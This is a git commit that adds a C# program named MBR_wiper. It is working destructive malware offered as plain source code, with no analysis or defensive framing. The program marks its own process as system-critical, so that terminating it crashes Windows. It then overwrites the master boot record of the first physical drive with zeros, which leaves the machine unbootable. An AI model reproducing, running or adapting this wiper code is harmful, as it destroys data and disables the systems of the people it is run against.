01af9de2117d46875e147711ea29ffd763452dbc
Doggosaurus <111173924+Doggosaurus@users.noreply.github.com>
2023-08-29 15:15:04 +0200

    Create Program.cs

---
+++ Program.cs
@@ -0,0 +1,80 @@
+using System;
+using System.Collections.Generic;
+using System.Diagnostics;
+using System.Linq;
+using System.Runtime.InteropServices;
+using System.Text;
+using System.Threading.Tasks;
+
+namespace MBR_wiper
+{
+    internal class Program
+    {
+        [DllImport("kernel32")]
+        private static extern IntPtr CreateFile(
+          string lpFileName,
+          uint dwDesiredAccess,
+          uint dwShareMode,
+          IntPtr lpSecurityAttributes,
+          uint dwCreationDisposition,
+          uint dwFlagsAndAttributes,
+          IntPtr hTemplateFile);
+
+
+        [DllImport("kernel32")]
+        private static extern bool WriteFile(
+            IntPtr hFile,
+            byte[] lpBuffer,
+            uint nNumberOfBytesToWrite,
+            out uint lpNumberOfBytesWritten,
+            IntPtr lpOverlapped);
+
+        private const uint GenericRead = 0x80000000;
+        private const uint GenericWrite = 0x40000000;
+        private const uint GenericExecute = 0x20000000;
+        private const uint GenericAll = 0x10000000;
+
+        private const uint FileShareRead = 0x1;
+        private const uint FileShareWrite = 0x2;
+
+        private const uint OpenExisting = 0x3;
+
+
+        private const uint FileFlagDeleteOnClose = 0x4000000;
+
+        private const uint MbrSize = 512u;
+
+        [DllImport("ntdll.dll", SetLastError = true)]
+        private static extern int NtSetInformationProcess(IntPtr hProcess, int processInformationClass, ref int processInformation, int processInformationLength);
+
+        static void Main(string[] args)
+        {
+
+            int isCritical = 1;
+            int BreakOnTermination = 0x1D;
+            Process.EnterDebugMode();
+
+            NtSetInformationProcess(Process.GetCurrentProcess().Handle, BreakOnTermination, ref isCritical, sizeof(int));
+            var mbrData = new byte[MbrSize];
+
+          
+
+
+            var mbr = CreateFile(
+            "\\\\.\\PhysicalDrive0",
+            GenericAll,
+            FileShareRead | FileShareWrite,
+            IntPtr.Zero,
+            OpenExisting,
+            0,
+            IntPtr.Zero);
+
+            WriteFile(mbr,
+            mbrData,
+            MbrSize,
+            out uint lpNumberOfBytesWritten,
+            IntPtr.Zero);
+            Environment.Exit(0);
+        }
+    }
+}
